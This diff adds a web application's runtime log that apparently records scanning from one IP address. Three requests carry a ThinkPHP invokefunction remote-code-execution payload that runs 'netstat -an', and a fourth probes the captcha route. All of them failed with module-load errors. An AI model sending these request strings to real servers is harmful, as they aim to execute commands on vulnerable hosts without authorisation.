@@ -1,0 +1,24 @@
+[ 2021-03-12T20:39:50+08:00 ] 47.110.180.67 /index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Index
+
+[ 2021-03-12T20:39:50+08:00 ] 47.110.180.67 /index.php/?s=/user/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:User
+
+[ 2021-03-12T20:39:50+08:00 ] 47.110.180.67 /index.php/?s=/install/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Install
+
+[ 2021-03-12T23:22:36+08:00 ] 47.110.180.65 /index.php?s=captcha
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Captcha
+
